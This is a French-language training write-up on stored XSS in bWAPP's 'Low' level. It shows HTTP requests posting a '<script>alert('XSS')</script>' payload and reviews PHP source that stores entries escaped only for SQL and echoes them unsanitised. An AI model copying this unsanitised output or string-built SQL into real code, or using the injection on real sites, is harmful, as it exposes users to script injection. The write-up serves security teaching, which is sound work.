# Niveau "Low"

## Exploitation

Le message est transmit en utilisant la méthode HTTP `POST` afin d'être affiché à l'utilisateur à la manière d'un forum :&#x20;

```http
POST /bWAPP/htmli_stored.php HTTP/1.1
Host: 192.168.56.116
Content-Length: 33
Origin: http://192.168.56.116
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.56.116/bWAPP/htmli_stored.php
Cookie: security_level=0; PHPSESSID=f6a34267dba7813049f6ba404b968d78
Connection: close

entry=Test&blog=submit&entry_add=
```

![](<../../../../../.gitbook/assets/image (24).png>)

Le message est donc ici stockée sur le serveur, sans doute en base de données, afin que tous les utilisateurs puissent y accéder (fonctionnalité Show all). L'injection XSS se fait de façon directe, grâce par exemple à `<script>alert('XSS')</script>` :&#x20;

```http
POST /bWAPP/htmli_stored.php HTTP/1.1
Host: 192.168.56.116
Content-Length: 76
Origin: http://192.168.56.116
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.56.116/bWAPP/htmli_stored.php
Cookie: security_level=0; PHPSESSID=f6a34267dba7813049f6ba404b968d78
Connection: close

entry=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&blog=submit&entry_add=
```

![](<../../../../../.gitbook/assets/image (32).png>)

## Analyse du code source

L'application récupère dans la variable `$entry` les messages stockés en base de données avant de les afficher sans assainissement préalable (ligne 45, correspondant au niveau "Low" ou 0) :&#x20;

{% code title="htmli_stored.php" %}
```php
<table id="table_yellow">
  <tr height="30" bgcolor="#ffb717" align="center">
    <td width="20">#</td>
    <td width="100"><b>Owner</b></td>
    <td width="100"><b>Date</b></td>
    <td width="445"><b>Entry</b></td>
  </tr>

<?php
  // Selects all the records
  $entry_all = isset($_POST["entry_all"]) ? 1 : 0;
  if($entry_all == false) {
    $sql = "SELECT * FROM blog WHERE owner = '" . $_SESSION["login"] . "'";
  }
  else {
    $sql = "SELECT * FROM blog";
  }
  
  $recordset = $link->query($sql);
  if(!$recordset) {
    // die("Error: " . $link->connect_error . "<br /><br />");
?>
  <tr height="50">
    <td colspan="4" width="665"><?php die("Error: " . $link->error);?></td>
  </tr>
<?php
  }
  while($row = $recordset->fetch_object()) {
    if($_COOKIE["security_level"] == "1" or $_COOKIE["security_level"] == "2") {
?>
  <tr height="40">
    <td align="center"><?php echo $row->id; ?></td>
    <td><?php echo $row->owner; ?></td>
    <td><?php echo $row->date; ?></td>
    <td><?php echo xss_check_3($row->entry); ?></td>
  </tr>
<?php
    }
    else {
?>
  <tr height="40">
    <td align="center"><?php echo $row->id; ?></td>
    <td><?php echo $row->owner; ?></td>
    <td><?php echo $row->date; ?></td>
    <td><?php echo $row->entry; ?></td>
  </tr>
<?php
    }
  }
  
  $recordset->close();
  $link->close();
?>
</table>
```
{% endcode %}

Un traitement est toutefois effectué lors de l'ajout du message en base (`entry_add`) par la méthode `htmli()` :&#x20;

{% code title="htmli_stored.php" %}
```php
if(isset($_POST["entry_add"])) {
  $entry = htmli($_POST["entry"]);
  $owner = $_SESSION["login"];

  if($entry == "") {
    $message =  "<font color=\"red\">Please enter some text...</font>";
  }
  else {
    $sql = "INSERT INTO blog (date, entry, owner) VALUES (now(),'" . $entry . "','" . $owner . "')";
    $recordset = $link->query($sql);
    if(!$recordset) {
      die("Error: " . $link->error . "<br /><br />");
    }

    $message = "<font color=\"green\">Your entry was added to our blog!</font>";
  }
}
```
{% endcode %}

Qui effectue un assainissement via la méthode `sqli_check_3()` :&#x20;

{% code title="htmli_stored.php" %}
```php
function htmli($data) {
  include("connect_i.php");

  switch($_COOKIE["security_level"]) {
    case "0" :
      $data = sqli_check_3($link, $data);
      break;
    case "1" :
      $data = sqli_check_3($link, $data);
      break;
    case "2" :
      $data = sqli_check_3($link, $data);
      break;
    default :
      $data = sqli_check_3($link, $data);
      break;
  }

  return $data;
}
```
{% endcode %}

Cette fonction effectue un assainissement protégeant contre les injections SQL (mais pas HTML/XSS) grâce à la méthode PHP `mysqli_real_scape_string()` :&#x20;

{% code title="functions_external.php" %}
```php
function sqli_check_3($link, $data) {
  return mysqli_real_escape_string($link, $data);
}
```
{% endcode %}
